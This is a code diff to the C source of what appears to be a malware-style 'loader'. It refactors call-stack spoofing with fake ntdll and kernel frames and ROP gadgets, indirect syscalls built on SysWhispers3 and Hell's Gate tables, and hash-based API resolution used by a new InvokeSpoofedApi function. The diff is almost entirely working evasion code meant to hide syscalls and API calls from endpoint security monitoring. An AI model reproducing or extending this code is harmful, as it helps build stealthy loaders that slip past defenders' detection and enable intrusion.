@@ -1,5 +1,55 @@
 #include "myloader.h"
 
+#ifndef ARRAYSIZE
+#define ARRAYSIZE(x) (sizeof(x) / sizeof((x)[0]))
+#endif
+
+static void InitSpoofConfig(SPOOFER* spoof, PVOID target, UINT64 argCount) {
+    if (!spoof) return;
+    memset(spoof, 0, sizeof(*spoof));
+
+    spoof->SpoofFunctionPointer = target;
+    spoof->Nargs = argCount;
+    spoof->ReturnAddress = (PVOID)g_returnAddress;
+
+    spoof->FirstFrameFunctionPointer = frame_Root_Ntdll;
+    spoof->SecondFrameFunctionPointer = frame_Mid_Kernel;
+    spoof->FirstFrameSize = g_FirstFrameSize;
+    spoof->SecondFrameSize = g_SecondFrameSize;
+    spoof->StackOffsetWhereRbpIsPushed = (DWORD64)g_RbpPushOffset;
+    spoof->FirstFrameRandomOffset = (DWORD64)g_FirstFrameOffset;
+    spoof->SecondFrameRandomOffset = (DWORD64)g_SecondFrameOffset;
+
+    spoof->JmpRbxGadget = g_pThunkGadget ? g_pThunkGadget : g_pRandomSyscallGadget;
+    spoof->AddRspXGadget = g_pStackGadget ? g_pStackGadget : g_pRandomSyscallGadget;
+    spoof->JmpRbxGadgetFrameSize = g_JmpRbxGadgetFrameSize;
+
+    if (spoof->AddRspXGadget == g_pStackGadget) {
+        spoof->AddRspXGadgetFrameSize = g_StackGadgetSize;
+    } else {
+        spoof->AddRspXGadgetFrameSize = 0;
+    }
+}
+
+static void FillSpoofArgs(SPOOFER* spoof, UINT64 argCount, va_list args) {
+    if (!spoof || !argCount) return;
+
+    PVOID* slots[] = {
+        &spoof->Arg01, &spoof->Arg02, &spoof->Arg03, &spoof->Arg04,
+        &spoof->Arg05, &spoof->Arg06, &spoof->Arg07, &spoof->Arg08,
+        &spoof->Arg09, &spoof->Arg10, &spoof->Arg11, &spoof->Arg12
+    };
+
+    UINT64 count = argCount;
+    if (count > ARRAYSIZE(slots)) {
+        count = ARRAYSIZE(slots);
+    }
+
+    for (UINT64 idx = 0; idx < count; idx++) {
+        *slots[idx] = (PVOID)va_arg(args, ULONG_PTR);
+    }
+}
+
 BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
 	if (!g_SyscallList.Count) SW3_PopulateSyscallList(pModuleBase);
 
@@ -58,71 +108,43 @@ NTSTATUS InvokeSpoofedSyscall(PVX_TABLE_ENTRY pEntry, UINT64 argCount, ...) {
     Gate(pEntry->wSystemCall, pEntry->pSyscallInst, pEntry->pGadget_Clean, pEntry->pGadget_Thunk);
 
     SPOOFER spoof = { 0 };
-    spoof.SpoofFunctionPointer = SyscallWrapper;
-    spoof.Nargs = argCount;
-    spoof.ReturnAddress = _AddressOfReturnAddress();
-
-    spoof.KernelBaseAddress = g_ntdllBase;
-    spoof.KernelBaseAddressEnd = (PVOID)((ULONG_PTR)g_ntdllBase + 0x400000); // rough upper bound
-
-    spoof.RtlUserThreadStartAddress = g_pRtlUserThreadStart;
-    spoof.BaseThreadInitThunkAddress = g_pBaseThreadInitThunk;
-    spoof.RtlUserThreadStartFrameSize = g_RtlFrameSize;
-    spoof.BaseThreadInitThunkFrameSize = g_BaseFrameSize;
-
-    spoof.FirstFrameFunctionPointer = g_pRtlUserThreadStart;
-    spoof.SecondFrameFunctionPointer = g_pBaseThreadInitThunk;
-    spoof.FirstFrameSize = g_RtlFrameSize;
-    spoof.SecondFrameSize = g_BaseFrameSize;
-    spoof.FirstFrameRandomOffset =(DWORD64)g_FirstFrameOffset;
-    spoof.SecondFrameRandomOffset =(DWORD64)g_SecondFrameOffset;
-
-    spoof.JmpRbxGadget = g_pThunkGadget ? g_pThunkGadget : g_pRandomSyscallGadget;
-    spoof.AddRspXGadget = g_pStackGadget ? g_pStackGadget : g_pRandomSyscallGadget;
-    // JmpRbxGadget 通常是 jmp [rbx] 或 call [rbx]，本身不涉及栈调整
-    spoof.JmpRbxGadgetFrameSize = g_JmpRbxGadgetFrameSize; 
-    
-    if (spoof.AddRspXGadget == g_pStackGadget) {
-        spoof.AddRspXGadgetFrameSize = g_StackGadgetSize+0x8;
-    } else {
-        spoof.AddRspXGadgetFrameSize = 0; // Fallback 情况
-    };
+    InitSpoofConfig(&spoof, SyscallWrapper, argCount);
 
     va_list args;
     va_start(args, argCount);
-    for (UINT64 idx = 0; idx < argCount && idx < 12; idx++) {
-        ULONG_PTR v = va_arg(args, ULONG_PTR);
-        switch (idx) {
-        case 0: spoof.Arg01 = (PVOID)v; break;
-        case 1: spoof.Arg02 = (PVOID)v; break;
-        case 2: spoof.Arg03 = (PVOID)v; break;
-        case 3: spoof.Arg04 = (PVOID)v; break;
-        case 4: spoof.Arg05 = (PVOID)v; break;
-        case 5: spoof.Arg06 = (PVOID)v; break;
-        case 6: spoof.Arg07 = (PVOID)v; break;
-        case 7: spoof.Arg08 = (PVOID)v; break;
-        case 8: spoof.Arg09 = (PVOID)v; break;
-        case 9: spoof.Arg10 = (PVOID)v; break;
-        case 10: spoof.Arg11 = (PVOID)v; break;
-        case 11: spoof.Arg12 = (PVOID)v; break;
-        default: break;
-        }
-    }
+    FillSpoofArgs(&spoof, argCount, args);
     va_end(args);
 
-    return (NTSTATUS)(ULONG_PTR)SpoofCall(&spoof);
+    NTSTATUS status = (NTSTATUS)(ULONG_PTR)SpoofCall(&spoof);
+    return status;
 }
+ULONG_PTR InvokeSpoofedApi(DWORD64 apiHash, UINT64 argCount, ...) {
+    if (!apiHash) return 0;
 
+    PVOID apiAddr = NULL;
+    if (g_kernelBaseAddr) {
+        apiAddr = GetProcAddressByName(g_kernelBaseAddr, apiHash);
+    }
+    if (!apiAddr && g_kernel32Base) {
+        apiAddr = GetProcAddressByName(g_kernel32Base, apiHash);
+    }
+    if (!apiAddr && g_ntdllBase) {
+        apiAddr = GetProcAddressByName(g_ntdllBase, apiHash);
+    }
+    if (!apiAddr) return 0;
+
+    SPOOFER spoof = { 0 };
+    InitSpoofConfig(&spoof, apiAddr, argCount);
+
+    va_list args;
+    va_start(args, argCount);
+    FillSpoofArgs(&spoof, argCount, args);
+    va_end(args);
+
+    return (ULONG_PTR)SpoofCall(&spoof);
+}
 DWORD SW3_HashSyscall(PCSTR FunctionName) {
-	DWORD i = 0;
-	DWORD Hash = SW3_SEED;
-
-	while (FunctionName[i]) {
-		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
-		Hash ^= PartialName + SW3_ROR8(Hash);
-	}
-
-	return Hash;
+    return djb2((PBYTE)FunctionName);
 }
 
 PVOID SC_Address(PVOID NtApiAddress) {
@@ -158,8 +180,6 @@ BOOL SW3_PopulateSyscallList(PVOID ntdllBase) {
     
     PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + DosHeader->e_lfanew);
     DWORD ImageSize = NtHeaders->OptionalHeader.SizeOfImage;
-    ULONG_PTR ImageEnd = (ULONG_PTR)ntdllBase + ImageSize;
-
     PIMAGE_DATA_DIRECTORY DataDirectory = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     DWORD VirtualAddress = DataDirectory->VirtualAddress;
     if (!VirtualAddress) return FALSE;
@@ -187,46 +207,27 @@ BOOL SW3_PopulateSyscallList(PVOID ntdllBase) {
 
     DWORD i = 0;
     PSW3_SYSCALL_ENTRY Entries = g_SyscallList.Entries;
-
-    // 3. 循环解析 (使用 for 循环)
     for (DWORD j = 0; j < NumberOfNames; j++) {
-        // [防御] 使用 SEH 捕获内存违规，防止单点故障导致全崩
         __try {
-            // [防御] 检查 Names[j] 是否越界
             if (!IS_ADDR_SAFE(&Names[j], ntdllBase, ImageSize)) continue;
 
             PCHAR FunctionName = SW3_RVA2VA(PCHAR, ntdllBase, Names[j]);
-            
-            // [防御] 检查字符串指针是否合法
             if (!IS_ADDR_SAFE(FunctionName, ntdllBase, ImageSize)) continue;
-
-            // 查找 "Zw" (0x775a)
             if (*(USHORT*)FunctionName == 0x775a) {
-                // [防御] 检查 Ordinal 索引是否越界 (关键崩溃源之一)
-                // Ordinals[j] 返回的是 AddressOfFunctions 的索引
                 WORD funcIndex = Ordinals[j];
                 if (funcIndex >= NumberOfFunctions) continue;
-
-                // 计算函数地址
                 DWORD funcRVA = Functions[funcIndex];
                 PVOID funcAddr = SW3_RVA2VA(PVOID, ntdllBase, funcRVA);
-
-                // [防御] 检查函数地址是否合法
                 if (!IS_ADDR_SAFE(funcAddr, ntdllBase, ImageSize)) continue;
 
                 Entries[i].Hash = SW3_HashSyscall(FunctionName);
                 Entries[i].Address = funcRVA;
-                
-                // SC_Address 内部会扫描内存，如果扫到页边界可能会崩
-                // 但因为我们在 __try 块里，所以就算崩了也会被捕获并跳过
                 Entries[i].SyscallAddress = SC_Address(funcAddr);
-
                 i++;
                 if (i == SW3_MAX_ENTRIES) break;
             }
         }
         __except (EXCEPTION_EXECUTE_HANDLER) {
-            // 捕获到异常 (0xC0000005)，静默跳过当前出错的函数，继续下一个
              continue;
         }
     }
